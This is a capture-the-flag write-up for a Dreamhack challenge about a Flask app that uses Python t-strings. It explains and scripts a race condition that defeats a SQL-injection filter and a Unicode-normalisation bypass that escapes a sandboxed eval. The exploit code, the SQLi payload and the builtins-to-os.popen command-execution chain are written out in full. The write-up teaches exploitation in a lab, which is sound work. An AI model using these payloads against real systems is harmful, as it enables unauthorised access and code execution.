## t-string  

<img src="images/chall.png" width=600>

This challenge involves a Flask server that handles user accounts with a SQLite database.  

```python
DATABASE = "database.db"

def init_db():
    db = sqlite3.connect(DATABASE)
    db.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL
    );
    """)
    db.execute(f"INSERT INTO users(username, password) VALUES ('admin', '{os.urandom(16).hex()}')")
    db.commit()
    db.close()

...

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return '''
        <form method="POST">
            Username: <input name="username" /><br/>
            Password: <input name="password" type="password" /><br/>
            <input type="submit" value="Login" />
        </form>
        '''
    else:
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        template = t"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        user = select_one(template)
        if user:
            session['username'] = user['username']
            return redirect("/")
        return '<script>alert("Invalid credentials");history.go(-1);</script>'

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "GET":
        return '''
        <form method="POST">
            Username: <input name="username" /><br/>
            Password: <input name="password" type="password" /><br/>
            <input type="submit" value="Register" />
        </form>
        '''
    else:
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        template = t"INSERT INTO users(username, password) VALUES ('{username}', '{password}')"
        try:
            insert(template)
            return '<script>alert("Registered successfully");location.href="/login";</script>'
        except sqlite3.IntegrityError:
            return '<script>alert("Username already exists");history.go(-1);</script>'
```

There is an `/admin/server-time` endpoint that requires admin privileges to access, so we can assume that it's related to the solve.  

```python
@app.route("/admin/server-time", methods=["GET"])
def server_time():
    if session.get("username") != "admin":
        return redirect("/login")

    time_fmt = request.args.get("time-fmt", "%Y-%m-%d %H:%M:%S")
    return render_template(t'Server time is: {datetime.now():{time_fmt}}')
```

The flag file is stored in the same directory as `app.py`, and the Dockerfile copies both into the container.  

<img src="images/dir.png" width=800>

```dockerfile
FROM python:3.14.0rc2-slim-bookworm

WORKDIR /app
COPY deploy/ /app/

RUN pip install flask
RUN useradd -m user
RUN chown -R user:user /app

USER user
EXPOSE 3000

CMD ["python", "app.py"]
```

In the `/login` endpoint, user-supplied arguments are directly interpolated into the query.  

The interesting thing is that the server uses a t-string to process the query. In this case, the `select_one()` query function is wrapped in a `sql_safe()` wrapper method.  

`sql_safe()` iterates through the t-string and sanitised interpolated arguments with a simple blacklist to prevent SQLi. Interestingly, `sql_safe()` performs a loose sanitisation by replacing blacklisted keywords and characters, rather than outright blocking the query.  

Our main obstacle is that the filter escapes `'`, which prevents us from directly escaping the string in the original query. Since this isn't MySQL or a similar dialect, we can't just use fragmented SQLi to bypass this.  

```python
def sql_safe(func: callable):
    parts = []
    def wrapper(query: Template):
        parts.clear()
        for i in query:
            match i:
                case str() as s:
                    parts.append(s)
                case Interpolation(value, expression, conversion, format_spec):
                    value = str(value)
                    value = re.sub(r"'", "''", value)
                    value = re.sub(r"SELECT|UNION|INSERT|UPDATE|DELETE", "", value, flags=re.IGNORECASE)
                    parts.append(value)

        query = "".join(parts)
        return func(query)

    return wrapper

@sql_safe
def select_one(query: Template):
    db = get_db()
    cur = db.execute(query)
    row = cur.fetchone()
    cur.close()
    return row
```

Thankfully, we can find this comment which hints that regex checks are slow, and this clearly hints towards a race condition.  

<img src="images/hint.png" width=800>

If we inspect `sql_safe()` closely, we will notice that `parts` is declared outside the wrapper, and any modifications made use the `.clear()` and `.append()` methods.  

This means that `parts` is never rebinded as a local variable inside `wrapper()`, making it a closure variable that persists among wrapper calls.  

```python
def sql_safe(func: callable):
    parts = []
    def wrapper(query: Template):
        parts.clear()
        for i in query:
            match i:
                case str() as s:
                    parts.append(s)
                case Interpolation(value, expression, conversion, format_spec):
                    ...
                    parts.append(value)

        ...
```

If we pad `username` with a sufficiently long string, we should be able to delay `re.sub()` long enough to race a second `wrapper()` call before `parts.clear()` is called, which will cause the `parts` list to make a duplicate `.append()` with our payload.  

```python
["SELECT * FROM users WHERE username='", 'or 1--<junk>', "' AND password='", 'a', "'", 'or 1--<junk>', "' AND password='", 'a', "'", 'or 1--a', "' AND password='", 'a', "'"]
```

Due to the duplicate `password`, `query.join()` will then escape the quote, giving us SQLi and allowing us to login as admin.  

```sql
SELECT * FROM users WHERE username=''' or 1--<junk>' AND password='a''' or 1--<junk>' AND password='a''
```

Programmatically, the exploit looks something like this.  

```python
import requests
import threading
import time

url = "http://host3.dreamhack.games:12256/"
s = requests.Session()

stop = threading.Event()

def sqli():
    while not stop.is_set():
        res = s.post(f"{url}/login", data={
            "username": "' or 1--" + "a" * 499_000, 
            "password": "a"
        }, allow_redirects=False)
        
        if res.status_code == 302:
            print("> Logged in")
            stop.set()

print("> Racing")

threads = [threading.Thread(target=sqli) for _ in range(5)]

for t in threads: 
    t.start()

while not stop.is_set():
    time.sleep(0.5)

stop.set()

for t in threads:
    t.join(timeout=1)
```

Now that we have admin login, we can finally focus on getting the flag. Since the flag file isn't referenced anywhere in the server source, we can infer that we are supposed to get RCE to read it.  

`/admin/server-time` allows us to supply a time format specifier, then interpolates it into another t-string and renders it with a custom defined `render_template()`.  

If we look at `render_template()`, we will notice a suspicious branch that calls `get_attr_safe()`.  

```python
def render_template(template: Template):
    parts = []
    for i in template:
        match i:
            case str() as s:
                parts.append(s)
            case Interpolation(value, expression, conversion, format_spec):
                match format_spec:
                    case "safe":
                        value = str(value)
                    case "xmlattr":
                        value = " ".join(f'{escape(str(k))}="{escape(str(v))}"' for k, v in value.items())
                    case str() if (m := re.match(r'attr\((.*)\)', format_spec)):
                        value = escape(get_attr_safe(value, m.group(1)))
                    case _:
                        value = escape(format(value, format_spec))
                
                parts.append(value)
    return "".join(parts)

@app.route("/admin/server-time", methods=["GET"])
def server_time():
    if session.get("username") != "admin":
        return redirect("/login")

    time_fmt = request.args.get("time-fmt", "%Y-%m-%d %H:%M:%S")
    return render_template(t'Server time is: {datetime.now():{time_fmt}}')
```

`get_attr_safe()` resolves object attributes through an `eval()` call with an empty `__builtins__`, and also enforces a simple blacklist.  

```python
def get_attr_safe(obj, attr):
    for keyword in ["class", "global", "builtins", "get", "mro", "module", "import", "eval", "exec"]:
        if keyword in attr:
            return ""
    try:
        return str(eval(f"obj['{attr}']", {"__builtins__": {}}, {"obj": obj}))
    except:
        try:
            return str(eval(f"obj.{attr}", {"__builtins__": {}}, {"obj": obj}))
        except:
            return ""
```

To bypass the blacklist, we can recall that Python uses NFKD normalisation to normalise identifier names, which allows us to italise blacklisted keywords.  

With that in mind, we can then use a simple attribute chain to escape the sandboxed `eval()` context and access `__builtins__`, then get RCE to read the flag.  

```python
attr(__𝘤𝘭𝘢𝘴𝘴__.__𝘮𝘳𝘰__[-1].__sub𝘤𝘭𝘢𝘴𝘴es__()[166].__init__.__𝘨𝘭𝘰𝘣𝘢𝘭s__["__buil""tins__"]["__imp""ort__"]("os").popen("cat flag").read())
```

Below is my full solve script for this challenge.  

```python
import requests
import threading
import time
import html
import re

url = "http://host3.dreamhack.games:12256/"
s = requests.Session()

stop = threading.Event()

def sqli():
    while not stop.is_set():
        res = s.post(f"{url}/login", data={
            "username": "or 1--" + "a" * 499_000, 
            "password": "a"
        }, allow_redirects=False)
        
        if res.status_code == 302:
            print("> Logged in")
            stop.set()

# race regex check
print("> Racing")

threads = [threading.Thread(target=sqli) for _ in range(5)]

for t in threads: 
    t.start()

while not stop.is_set():
    time.sleep(0.5)

stop.set()

for t in threads:
    t.join(timeout=1)

# ssti
def obf(s):
    banned = {
        'class': '𝘤𝘭𝘢𝘴𝘴',
        'global': '𝘨𝘭𝘰𝘣𝘢𝘭',
        'mro': '𝘮𝘳𝘰',
    }

    for bad in banned:
        if bad in s:
            s = s.replace(bad, banned[bad])

    return s

cmd = 'cat flag'
payload = '__class__.__mro__[-1].__subclasses__()[166].__init__.__globals__["__buil""tins__"]["__imp""ort__"]("os").popen("%s").read()' % cmd

res = s.get(f'{url}/admin/server-time', params={
    'time-fmt': 'attr(%s)' % obf(payload)
})

flag = re.findall(r'(DH{.+?})', html.unescape(res.text))[0].strip()
print("Flag:", flag)
```

Flag: `DH{wargame|attr(flag)}`